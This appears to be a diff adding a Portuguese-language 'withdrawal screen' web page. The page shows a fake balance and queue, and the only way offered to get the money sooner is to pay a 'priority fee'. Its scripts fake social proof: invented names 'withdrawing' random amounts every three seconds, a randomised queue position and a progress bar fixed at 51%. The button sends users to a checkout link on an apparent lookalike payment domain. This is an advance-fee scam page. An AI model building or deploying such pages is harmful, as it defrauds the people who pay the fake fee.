@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tela de Saque</title>
+    <link rel="stylesheet" href="stylesup1.css">
+    <style>
+        .progress-container {
+            width: 100%;
+            max-width: 350px; /* Ajusta a largura máxima */
+            height: 10px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 30px; /* Centraliza e adiciona espaçamento */
+        }
+
+        .progress-bar {
+            width: 51%; /* Define o progresso */
+            height: 100%;
+            background-color: #ff359a;
+        }
+
+        .progress-text {
+            font-weight: bold;
+            text-align: start;
+            font-size: 12px;
+            color: #ff69b4;
+            margin-bottom: 5px; /* Espaço entre o texto e a barra */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="topo">
+        ⚠️ Sua posição na fila: <span class="numero">96</span>
+    </div>
+
+    <div class="container">
+        <div class="caixa">
+            <div class="saldo-header">
+                <p class="saldo-titulo">Saldo disponível</p>
+                <span class="processando">⚠️ NA FILA</span>
+            </div>
+            <p class="saldo">R$ 579,41</p>
+            
+            <p class="atencao">
+                <b style="font-size: 30px;">Atenção:</b> <br><br> Devido a alta demanda de saques, você foi colocado(a) em uma fila para receber seu dinheiro.<br>
+            </p>
+            <br>
+            <p class="mensagem">
+                Seu saque irá cair entre 24 à 30 dias úteis. Mas podemos oferecer a você uma taxa adicional que te colocará em uma fila de prioridade,
+                sendo assim, você irá receber seu dinheiro em no máximo 10 minutos via <strong>PIX</strong>.
+            </p>
+
+            <!-- Texto e Barra de Progresso -->
+            <p class="progress-text">51% concluído</p>
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+
+            <!-- Botão de Saque -->
+            <button class="botao-sacar">SOLICITAR SAQUE IMEDIATO</button>
+        </div>
+    </div>
+
+    <div class="notificacao-container" id="notificacaoContainer"></div>
+
+    <script>
+        // Função para gerar um número aleatório
+        function gerarNumeroAleatorio(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        // Lista de nomes fictícios
+        const nomes = [
+            "Maria Soares",
+            "João Silva",
+            "Ana Costa",
+            "Carlos Pereira",
+            "Fernanda Lima",
+            "Rafael Alves",
+            "Patrícia Souza",
+            "Bruno Martins",
+            "Gabriela Nogueira",
+            "Marcelo Vieira",
+            "Lucas Carvalho",
+            "Sofia Almeida",
+            "Renato Fonseca",
+            "Helena Rocha",
+            "Paulo César",
+            "Isabela Monteiro",
+            "Tiago Fernandes",
+            "Lúcia Andrade"
+        ];
+
+        // Referência ao container de notificações
+        const notificacaoContainer = document.getElementById('notificacaoContainer');
+
+        // Função para criar uma nova notificação
+        function criarNotificacao() {
+            // Limita as notificações exibidas
+            if (notificacaoContainer.children.length === 2) {
+                limparNotificacoes();
+            }
+
+            // Escolhe um nome e um valor aleatório
+            const nome = nomes[Math.floor(Math.random() * nomes.length)];
+            const valor = gerarNumeroAleatorio(384, 800); // Valor maior que R$ 383,00
+
+            // Cria o elemento de notificação
+            const notificacao = document.createElement('div');
+            notificacao.classList.add('notificacao');
+            notificacao.innerHTML = `
+                <span><i>✔️</i> <strong>${nome}</strong> sacou R$ ${valor},00</span>
+            `;
+
+            // Adiciona a notificação ao container
+            notificacaoContainer.appendChild(notificacao);
+        }
+
+        // Função para limpar notificações com animação
+        function limparNotificacoes() {
+            const notificacoes = document.querySelectorAll('.notificacao');
+            notificacoes.forEach((notificacao) => {
+                notificacao.classList.add('hidden'); // Adiciona classe para sumir com animação
+                setTimeout(() => notificacao.remove(), 500); // Remove do DOM após a animação
+            });
+        }
+
+        // Intervalo para criar notificações (3 segundos)
+        setInterval(criarNotificacao, 3000); // 3000ms = 3 segundos
+    </script>
+
+    <script>
+        // Função para gerar um número aleatório entre min e max
+        function gerarNumeroAleatorio(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min + 100;
+        }
+
+        // Seleciona o elemento onde o número será atualizado
+        const elementoNumero = document.querySelector('.numero');
+
+        // Gera um número aleatório entre 1 e 100 e atualiza no HTML
+        const numeroAleatorio = gerarNumeroAleatorio(1, 100);
+        elementoNumero.textContent = numeroAleatorio;
+    </script>
+
+    <script>
+        document.querySelector('.botao-sacar').addEventListener('click', function () {
+            window.location.href = 'https://pay.seupagseguro.com/checkout/1e76a394-286d-46c9-91c5-e5ada2a24e80';
+        });
+    </script>
+
+</body>
+
+</html>
